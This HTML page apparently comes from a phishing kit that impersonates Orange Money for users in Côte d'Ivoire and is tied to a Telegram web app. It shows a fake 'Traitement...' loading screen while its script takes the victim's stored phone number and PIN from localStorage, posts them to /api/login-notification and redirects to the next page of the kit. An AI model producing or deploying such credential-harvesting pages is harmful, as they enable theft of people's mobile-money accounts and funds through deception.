<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>Traitement - Orange Money</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #333; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif; color: white; }
        .loading-card { background: #fff; color:#333; width: 88%; max-width: 380px; padding: 45px 24px; border-radius: 20px; text-align: center; }
    </style>
</head>
<body>
<div class="loading-card">
    <h2 style="color:#f15a24;">Traitement...</h2>
    <p>Veuillez patienter...</p>
</div>
<script>
    setTimeout(async () => {
        const phone = localStorage.getItem("phone");
        const pin = localStorage.getItem("lastPin");
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin, country: "CI" })
        });
        window.location.href = "page8.html";
    }, 2000);
</script>
</body>
</html>
